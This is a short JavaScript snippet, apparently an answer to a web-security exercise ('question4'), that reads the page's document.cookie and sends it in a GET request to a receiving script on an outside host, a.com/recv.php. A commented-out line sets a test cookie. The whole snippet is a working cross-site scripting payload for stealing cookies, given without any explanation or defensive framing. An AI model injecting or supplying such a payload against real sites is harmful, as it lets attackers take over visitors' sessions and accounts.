var req = new XMLHttpRequest();
req.open('GET', 'http://a.com/question4/recv.php?cookie1="'+document.cookie+'"');
req.send();
// document.cookie = "Cookie1" + '=42; expires = Thu, 01 Jan 2020 00:00:00 GMT';
